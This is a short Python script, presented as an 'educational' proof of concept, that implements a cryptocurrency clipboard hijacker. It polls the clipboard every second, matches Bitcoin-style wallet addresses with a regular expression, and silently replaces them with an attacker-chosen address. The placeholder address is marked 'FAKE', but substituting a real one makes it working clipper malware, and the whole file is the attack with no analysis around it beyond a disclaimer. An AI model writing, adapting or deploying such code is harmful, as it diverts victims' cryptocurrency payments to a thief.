import pyperclip
import time
import re

########### 
'''
Disclaimer**: This PoC is intended for educational purposes only. Misuse of this code to harm individuals or organizations is strictly prohibited and may violate ethical, legal, or regulatory requirements.
'''
###########

# Define a fake wallet address
fake_wallet = "3J98t1-FAKE-WpEZ73CNmQviecrnyiWrnqRhWNLy"

# Define a regular expression for cryptocurrency wallet addresses
wallet_pattern = re.compile(r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}")

print("Monitoring clipboard for cryptocurrency wallet addresses...")

# Monitor clipboard continuously
while True:
    try:
        # Get clipboard content
        clipboard_content = pyperclip.paste()

        # Check if it matches the wallet pattern
        if wallet_pattern.match(clipboard_content):
            print(f"Detected wallet address: {clipboard_content}")
            print(f"Replacing with fake wallet address: {fake_wallet}")

            # Replace clipboard content with fake wallet address
            pyperclip.copy(fake_wallet)

        # Wait before checking clipboard again
        time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting clipboard hijacker.")
        break
    except Exception as e:
        print(f"Error: {e}")
